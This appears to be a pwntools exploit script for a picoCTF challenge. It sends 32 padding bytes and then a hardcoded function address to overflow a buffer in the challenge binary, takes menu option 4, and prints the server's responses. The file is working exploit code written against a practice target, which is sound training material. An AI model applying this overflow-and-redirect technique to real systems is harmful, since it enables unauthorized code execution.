#!/usr/bin/env python3

from pwn import *

HOST = "mimas.picoctf.net"
PORT = 64008

exe = ELF("./chall_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'warn'

gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
    else:
        r = remote(HOST, PORT)

    return r


def main():
    r = conn()
    junk = b'A' * 32
    payload = junk
    payload += p64(0x00000000004011a0)
    r.sendlineafter('choice:', b'2')
    r.sendlineafter('buffer:', payload)
    r.sendlineafter('choice:', b'4')
    output = r.recvline()
    print(output)
    output = r.recvline()
    print(output)
    output = r.recvline()
    print(output)

    r.interactive()


if __name__ == "__main__":
    main()

